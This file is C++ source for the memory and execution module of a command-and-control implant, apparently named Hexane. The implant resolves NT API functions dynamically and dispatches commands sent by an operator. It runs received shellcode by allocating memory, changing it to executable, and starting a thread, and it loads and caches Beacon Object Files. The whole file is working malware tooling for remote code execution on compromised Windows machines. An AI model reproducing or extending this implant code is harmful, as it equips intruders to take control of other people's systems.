#include <core/include/memory.hpp>

using namespace Hash;
using namespace Opsec;
using namespace Utils;
using namespace Parser;
using namespace Modules;
using namespace Objects;
using namespace Threads;
using namespace Commands;

namespace Memory {
    namespace Methods {

		PRESOURCE FindIntResource(HMODULE base, CONST INT rsrc_id) {
            HEXANE;

            HRSRC rsrc_info	= { };
            PRESOURCE object = (RESOURCE*)Malloc(sizeof(_resource));

            x_assert(rsrc_info          = ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
            x_assert(object->h_global   = ctx->win32.LoadResource(base, rsrc_info));
            x_assert(object->size       = ctx->win32.SizeofResource(base, rsrc_info));
            x_assert(object->rsrc_lock  = ctx->win32.LockResource(object->h_global));

			defer:
            return object;
        }

        VOID FindHeaders(EXECUTABLE *exe) {
            HEXANE;

            exe->nt_head = (PIMAGE_NT_HEADERS) (B_PTR(exe->buffer) + ((PIMAGE_DOS_HEADER)exe->buffer)->e_lfanew);
            exe->symbols = (PCOFF_SYMBOL) (B_PTR(exe->buffer) + exe->nt_head->FileHeader.PointerToSymbolTable);
            exe->exports = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(exe->buffer) + exe->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
			exe->size = (SIZE_T) (B_PTR(exe->buffer) + exe->nt_head->OptionalHeader.SizeOfImage);
        }
    }

    namespace Context {

        BOOL ContextInit() {
            HEXANE;
            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/

            _hexane instance = { };
			SIZE_T size = sizeof(void*);
			ULONG protect = 0;

            instance.teb = NtCurrentTeb();
            instance.heap = instance.teb->ProcessEnvironmentBlock->ProcessHeap;

            instance.teb->LastErrorValue = ERROR_SUCCESS;
            instance.base.address = U_PTR(InstStart());
            instance.base.size = U_PTR(InstEnd()) - instance.base.address;

            if (!(instance.modules.ntdll = (HMODULE) FindModuleEntry(NTDLL)->DllBase)) {
                return false;
            }

            F_PTR_HMOD(instance.win32.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP);
            F_PTR_HMOD(instance.win32.NtProtectVirtualMemory, instance.modules.ntdll, NTPROTECTVIRTUALMEMORY);
            F_PTR_HMOD(instance.win32.FlushInstructionCache, instance.modules.kernel32, FLUSHINSTRUCTIONCACHE);

            if (!instance.win32.RtlAllocateHeap || !instance.win32.NtProtectVirtualMemory) {
                return false;
            }

            VOID *global = RVA(LPVOID, instance.base.address, &__global);
			VOID *glob_a = global;

			if (!NT_SUCCESS(instance.win32.NtProtectVirtualMemory(NtCurrentProcess(), &glob_a, &size, PAGE_READWRITE, &protect)) ||
				!(C_DREF(global) = instance.win32.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
                return false;
            }

            MemCopy(C_DREF(global), &instance, sizeof(_hexane));
            MemSet(&instance, 0, sizeof(_hexane));
            //MemSet(global + sizeof(LPVOID), 0, 0xe);

            return true;
        }

        VOID ContextDestroy() {
            HEXANE;
            // TODO: ContextDestroy needs expanded to destroy all strings (http/smb context + anything else)

            auto free = ctx->win32.RtlFreeHeap;
            auto heap = ctx->heap;

            // free bof executables
			// free ctx->strings

            for (auto head = ctx->bof_cache; head; head = head->next) {
                RemoveCOFF(head->bof_id);
            }

            if (free) {
                free(heap, 0, ctx);
            }
        }
    }

    namespace Execute {

        BOOL ExecuteCommand(_parser parser) {
            HEXANE;

            UINT_PTR pointer = 0;

            const auto cmd_id = UnpackUint32(&parser);
            if (cmd_id == NOJOB) {
                return true;
            }

            if (!(pointer = FindCommandAddress(cmd_id))) {
                // LOG ERROR
                return false;
            }

            const auto cmd = (void(*)(_parser*)) RVA(PBYTE, ctx->base.address, pointer);
            cmd(&parser);

            return true;
        }

		// TODO: process migration
        BOOL ExecuteShellcode(_parser parser) {
            HEXANE;

            void *base      = nullptr;
            void (*exec)()  = nullptr;

        	HANDLE handle	= nullptr;
            BOOL success	= false;

            size_t size = parser.length;

            if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                // LOG ERROR
                goto defer;
            }

            MemCopy(base, parser.buffer, parser.length);

            if (!NT_SUCCESS(ctx->win32.NtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, nullptr))) {
                // LOG ERROR
                goto defer;
            }

            exec = (void(*)()) base;
            ntstatus = ctx->win32.NtCreateThreadEx(&handle, THREAD_ALL_ACCESS, nullptr, NtCurrentProcess(), (PUSER_THREAD_START_ROUTINE) exec, nullptr, NULL, NULL, NULL, NULL, nullptr);

            MemSet(base, 0, size);
            success = true;

            defer:
            if (base) {
                ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &base, &size, MEM_FREE);
            }

            return success;
        }

        VOID LoadObject(_parser parser) {
            HEXANE;

            COFF_PARAMS *bof  = (COFF_PARAMS *) Malloc(sizeof(COFF_PARAMS));
            COFF_PARAMS *saved = nullptr;

            bof->entrypoint = UnpackString(&parser, (uint32 *) &bof->entrypoint_length);
            bof->data       = UnpackBytes(&parser, (uint32 *) &bof->data_size);
            bof->args       = UnpackBytes(&parser, (uint32 *) &bof->args_size);
            bof->b_cache    = UnpackByte(&parser);
            bof->bof_id		= UnpackUint32(&parser);
            bof->task_id    = ctx->session.current_taskid;

            // TODO: with previously loaded BOFs (peer_id, task_id, type, length, [entrypoint, null, args, etc..])
            // TODO: test that bof data size being zero is a correct way to do this

            if (!bof->data_size) {
                saved = FindCOFF(bof->bof_id);

                bof->data      = saved->data;
                bof->data_size = saved->data_size;
            }

            if (!CreateUserThread(NtCurrentProcess(), (void *) COFFThread, bof, nullptr)) {
                // LOG ERROR
                // do not return
            }

            if (!saved) {
                AddCOFF(bof);
            }

            // NOTE: keep original task_id after every run or update (?)
            // NOTE: operator now has the option to remove a BOF any time with b_cache (false == "remove")
            // TODO: server should keep BOF information stored locally for this

            if (!bof->b_cache) {
                RemoveCOFF(bof->bof_id);
            }
        }
    }
}
